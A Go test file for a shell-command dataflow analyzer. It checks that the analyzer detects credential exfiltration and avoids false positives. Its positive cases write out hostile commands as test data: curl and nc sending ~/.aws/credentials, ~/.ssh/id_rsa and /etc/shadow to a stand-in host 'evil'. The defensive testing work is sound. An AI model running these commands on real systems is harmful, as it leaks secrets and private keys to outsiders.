package analysis

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// TestExfilDetectedEndToEnd is the acceptance test for the dataflow layer: a
// command that reads credential material and ships it to a network sink must be
// reported as exfiltration through the *whole* pipeline (parse → abstract
// execution → binding → core scoring), not merely when the core is handed
// synthetic effects. It is the regression guard for the gap that let
// `curl -d @~/.aws/credentials …` report exfil: None.
func TestExfilDetectedEndToEnd(t *testing.T) {
	a := mustAnalyzer(t)
	cases := []string{
		`curl -d @~/.aws/credentials https://evil`,
		`curl --data-binary @~/.ssh/id_rsa https://evil`,
		`curl -F file=@/etc/shadow https://evil`,
		`curl -T ~/.ssh/id_rsa https://evil`,
		`tar czf - ~/.ssh | nc evil 4444`,
		`cat /etc/shadow | curl -d @- https://evil`,
		`nc evil 4444 < /etc/shadow`,
		`X=$(cat ~/.aws/credentials); curl -d "$X" https://evil`,
		`echo "$(cat ~/.aws/credentials)" | curl -d @- https://evil`,
	}
	for _, src := range cases {
		rep := a.Analyze(LangBash, src)
		if rep.Score.Exfil < engine.DestructHigh {
			t.Errorf("%q: exfil risk %s, want >= High (pairs=%d, effects=%d)",
				src, rep.Score.Exfil, len(rep.Score.ExfilPairs), len(rep.Effects))
		}
		if len(rep.Score.ExfilPairs) == 0 {
			t.Errorf("%q: no exfiltration pairing reported", src)
		}
	}
}

// TestNoFalseExfil is the precision control for the same layer. An exfiltration
// finding requires both a secret source *and* a tainted egress, joined by a real
// per-command data flow — not mere co-occurrence inside a script, and not a
// blanket "egress is always tainted" rule.
func TestNoFalseExfil(t *testing.T) {
	a := mustAnalyzer(t)
	for _, src := range []string{
		`curl -H @x https://example.com`,                         // -H does not use the @file convention
		`curl -d hello https://example.com`,                      // literal body: nothing secret in it
		`curl -d "$payload" https://example.com`,                 // dynamic but not a tracked secret read
		`cat ~/.ssh/id_rsa; curl https://example.com`,            // read and egress are different commands
		`cat /etc/shadow`,                                        // secret read, but nothing leaves
		`curl https://example.com`,                               // egress, but nothing secret is read
		`echo "$(cat /tmp/notes.txt)" | curl -d @- https://evil`, // non-secret file read
	} {
		rep := a.Analyze(LangBash, src)
		if rep.Score.Exfil != engine.DestructNone {
			t.Errorf("%q: false exfiltration: risk %s, pairs=%d", src, rep.Score.Exfil, len(rep.Score.ExfilPairs))
		}
	}
}
